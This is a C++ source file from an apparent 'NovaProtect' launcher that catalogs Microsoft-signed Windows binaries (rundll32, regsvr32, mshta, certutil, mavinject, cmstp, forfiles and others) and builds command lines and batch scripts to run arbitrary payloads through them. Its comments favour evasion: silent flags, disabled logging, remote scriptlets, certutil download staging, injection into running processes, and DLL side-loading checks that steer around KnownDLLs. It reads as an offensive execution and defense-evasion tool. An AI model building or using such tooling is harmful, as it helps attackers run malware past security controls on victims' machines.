// NovaProtect signed-host launch plans - catalog and rendering.
#include "white_launcher.h"

#include <algorithm>
#include <cctype>
#include <filesystem>
#include <sstream>

namespace np {
namespace {

const char* const kSystem32 = "%SystemRoot%\\System32\\";

} // namespace

const std::vector<WhiteHost>& WhiteLauncher::catalog() {
    static const std::vector<WhiteHost> hosts = {
        {"rundll32.exe", "%SystemRoot%\\System32\\rundll32.exe",
         "x64 DLL exporting a void(HWND, HINSTANCE, LPSTR, int) entry",
         "rundll32.exe <dll>,<export> [args]",
         "Signed and present on every install. The exported function must take the "
         "rundll32 calling convention; anything else terminates the process without "
         "a useful error, which is the usual reason a plan silently does nothing."},

        {"regsvr32.exe", "%SystemRoot%\\System32\\regsvr32.exe",
         "DLL exporting DllRegisterServer (or a .sct script through scrobj.dll)",
         "regsvr32.exe [/s] [/u] [/i:<arg>] <dll|script-url>",
         "/s suppresses the success dialog. The /i: scriptlet form goes through the "
         "already-loaded scrobj.dll, so the payload can be a remote .sct."},

        {"mshta.exe", "%SystemRoot%\\System32\\mshta.exe",
         "HTA file, http(s) URL, or javascript:/vbscript: expression",
         "mshta.exe <hta|url|javascript:...>",
         "Runs with the caller's token; HTML host means no console window."},

        {"certutil.exe", "%SystemRoot%\\System32\\certutil.exe",
         "staging only (download / decode), not execution",
         "certutil.exe -urlcache -split -f <url> <out> | -decode <in> <out>",
         "A staging host, not a launcher: it writes bytes to disk. Pair it with a "
         "second stage from the catalog. Also carries a certificate-store surface."},

        {"conhost.exe", "%SystemRoot%\\System32\\conhost.exe",
         "command line for a child console process",
         "conhost.exe <image> [args]",
         "Spawns the child attached to a console; useful when the parent has no "
         "console of its own. Behaviour varies by Windows build."},

        {"InstallUtil.exe", "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
         ".NET assembly with an installer class",
         "InstallUtil.exe /logfile= /LogToConsole=false /U <assembly>",
         "/U runs the uninstall path; the /logfile= form with no value disables the "
         "log file so nothing is written next to the assembly."},

        {"mavinject.exe", "%SystemRoot%\\System32\\mavinject.exe",
         "x64 DLL to map into an existing process",
         "mavinject.exe <pid> /INJECTRUNNING <dll>",
         "Microsoft-signed injector shipped with App-V. Needs a live target pid and "
         "the same integrity level as that target."},

        {"wscript.exe", "%SystemRoot%\\System32\\wscript.exe",
         "VBScript or JScript file",
         "wscript.exe //B <script>",
         "//B suppresses dialogs and errors. Script host policy may block it in "
         "hardened environments."},

        {"cmstp.exe", "%SystemRoot%\\System32\\cmstp.exe",
         "INF file with a RunPreSetupCommandsSection",
         "cmstp.exe /s <inf>",
         "/s installs silently. The INF's RunPreSetupCommandsSection is executed by "
         "a signed binary."},

        {"forfiles.exe", "%SystemRoot%\\System32\\forfiles.exe",
         "command line executed once per matched file",
         "forfiles.exe /p <dir> /m <mask> /c \"cmd /c <command>\"",
         "Argument-surface abuse: the /c value is a command line, so the payload "
         "never appears as the image name."},
    };
    return hosts;
}

const WhiteHost* WhiteLauncher::find(const std::string& host_name) {
    std::string lowered = host_name;
    std::transform(lowered.begin(), lowered.end(), lowered.begin(),
                   [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    for (const auto& host : catalog()) {
        std::string name = host.name;
        std::transform(name.begin(), name.end(), name.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        if (name == lowered) return &host;
    }
    return nullptr;
}

std::string WhiteLauncher::quote(const std::string& arg) {
    if (arg.empty()) return "\"\"";
    const bool needs = arg.find_first_of(" \t\n\v\"") != std::string::npos;
    if (!needs) return arg;
    std::string out = "\"";
    for (auto it = arg.begin();; ++it) {
        size_t backslashes = 0;
        while (it != arg.end() && *it == '\\') { ++it; ++backslashes; }
        if (it == arg.end()) {
            out.append(backslashes * 2, '\\');
            break;
        }
        if (*it == '"') {
            out.append(backslashes * 2 + 1, '\\');
            out.push_back('"');
        } else {
            out.append(backslashes, '\\');
            out.push_back(*it);
        }
    }
    out.push_back('"');
    return out;
}

bool WhiteLauncher::plan(const std::string& host_name, const std::string& payload,
                         const std::string& export_name, WhiteLaunchPlan& out, std::string& error) {
    const WhiteHost* host = find(host_name);
    if (!host) { error = "unknown signed host: " + host_name; return false; }
    if (payload.empty()) { error = "empty payload path"; return false; }

    out = WhiteLaunchPlan{};
    out.host_name = host->name;
    out.host_path = host->path;
    out.payload_path = payload;
    out.export_name = export_name;

    // Catalog names carry their shipped spelling ("InstallUtil.exe"), so the
    // argument-template switch below has to compare case-insensitively --
    // otherwise that host falls into "no argument template" despite having one.
    std::string lowered(host->name);
    std::transform(lowered.begin(), lowered.end(), lowered.begin(),
                   [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    if (lowered == "rundll32.exe") {
        if (export_name.empty()) {
            error = "rundll32 needs an export name (the DLL entry argument)";
            return false;
        }
        out.argv = {payload + "," + export_name};
        out.prerequisites = {
            "payload must expose the export as void f(HWND, HINSTANCE, LPSTR, int)",
            "run as the same architecture as the payload (x64 host, x64 DLL)",
        };
    } else if (lowered == "regsvr32.exe") {
        out.argv = {"/s", payload};
        out.prerequisites = {
            "payload must export DllRegisterServer",
            "the /i: scriptlet form requires a .sct and scrobj.dll present",
        };
    } else if (lowered == "mshta.exe") {
        out.argv = {payload};
        out.prerequisites = {"payload is interpreted by the HTML host, not loaded as an image"};
    } else if (lowered == "certutil.exe") {
        out.argv = {"-urlcache", "-split", "-f", payload, export_name.empty() ? "stage.bin" : export_name};
        out.prerequisites = {"network reachability for the URL form", "staging only: this writes, it does not run"};
        out.notes.push_back("chain a second host from the catalog for execution");
    } else if (lowered == "conhost.exe") {
        out.argv = {payload};
        out.prerequisites = {"parent must not already own the console"};
        out.notes.push_back("argument forwarding differs between Windows 10 and 11");
    } else if (lowered == "installutil.exe") {
        out.argv = {"/logfile=", "/LogToConsole=false", "/U", payload};
        out.prerequisites = {"payload is a .NET assembly with an installer class", ".NET Framework 4.x present"};
    } else if (lowered == "mavinject.exe") {
        out.argv = {export_name.empty() ? "0" : export_name, "/INJECTRUNNING", payload};
        out.prerequisites = {"target pid must exist and share the caller's integrity level"};
        out.notes.push_back("the pid argument is positional; 0 is a placeholder, not a default");
    } else if (lowered == "wscript.exe") {
        out.argv = {"//B", payload};
        out.prerequisites = {"script host not disabled by policy"};
    } else if (lowered == "cmstp.exe") {
        out.argv = {"/s", payload};
        out.prerequisites = {"INF needs a RunPreSetupCommandsSection", "cmstp not blocked by application control"};
    } else if (lowered == "forfiles.exe") {
        const std::string dir = payload.substr(0, payload.find_last_of("/\\") == std::string::npos
                                                      ? 0 : payload.find_last_of("/\\"));
        out.argv = {"/p", dir.empty() ? "." : dir, "/m", "*.exe", "/c",
                    "cmd /c \"" + payload + "\""};
        out.prerequisites = {"the /c value is parsed by forfiles, then by cmd: quote twice"};
    } else {
        error = "host has no argument template: " + std::string(host->name);
        return false;
    }

    const std::string host_path = host->path[0] ? std::string(host->path)
                                               : std::string(kSystem32) + host->name;
    std::string line = quote(host_path);
    for (const auto& arg : out.argv) {
        line += " ";
        line += quote(arg);
    }
    out.command_line = line;
    return true;
}

bool WhiteLauncher::validateSideLoad(const std::string& host_path, const std::string& dll_name,
                                     std::string& error, std::string* warning) {
    std::error_code ec;
    if (!std::filesystem::exists(host_path, ec)) {
        error = "host does not exist: " + host_path;
        return false;
    }
    if (dll_name.empty()) { error = "empty DLL name"; return false; }
    const std::string lowered = [&] {
        std::string s = dll_name;
        std::transform(s.begin(), s.end(), s.begin(),
                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
        return s;
    }();
    // A name already in KnownDLLs is resolved from System32 by the loader and
    // ignores the application directory entirely.
    static const char* const kKnown[] = {
        "kernel32.dll", "user32.dll", "gdi32.dll", "advapi32.dll", "ntdll.dll",
        "ole32.dll", "oleaut32.dll", "shell32.dll", "shlwapi.dll", "ws2_32.dll",
        "combase.dll", "rpcrt4.dll", "msvcrt.dll", "sechost.dll", "bcrypt.dll",
    };
    for (const char* known : kKnown) {
        if (lowered == known) {
            error = dll_name + " is a KnownDLLs entry; the loader resolves it from System32 "
                              "and never from the application directory";
            return false;
        }
    }
    if (warning) {
        *warning = "search order: application directory first, then System32. Place the DLL "
                   "next to the host or in the same directory the host is launched from.";
    }
    return true;
}

std::string WhiteLaunchPlan::renderScript(const std::string& title) const {
    std::ostringstream os;
    os << "@echo off\r\n";
    os << "rem " << title << "\r\n";
    os << "rem host: " << host_name << " (" << host_path << ")\r\n";
    os << "rem payload: " << payload_path << "\r\n";
    for (const auto& note : notes) os << "rem note: " << note << "\r\n";
    os << "\r\n";
    os << command_line << "\r\n";
    return os.str();
}

std::string WhiteLaunchPlan::renderManifest() const {
    auto esc = [](const std::string& value) {
        std::string out;
        for (char c : value) {
            if (c == '"' || c == '\\') out.push_back('\\');
            out.push_back(c);
        }
        return out;
    };
    std::ostringstream os;
    os << "{\n";
    os << "  \"host\": \"" << esc(host_name) << "\",\n";
    os << "  \"hostPath\": \"" << esc(host_path) << "\",\n";
    os << "  \"payload\": \"" << esc(payload_path) << "\",\n";
    os << "  \"export\": \"" << esc(export_name) << "\",\n";
    os << "  \"commandLine\": \"" << esc(command_line) << "\",\n";
    os << "  \"argv\": [";
    for (size_t i = 0; i < argv.size(); i++) {
        if (i) os << ", ";
        os << "\"" << esc(argv[i]) << "\"";
    }
    os << "],\n";
    os << "  \"prerequisites\": [";
    for (size_t i = 0; i < prerequisites.size(); i++) {
        if (i) os << ", ";
        os << "\"" << esc(prerequisites[i]) << "\"";
    }
    os << "]\n";
    os << "}\n";
    return os.str();
}

} // namespace np
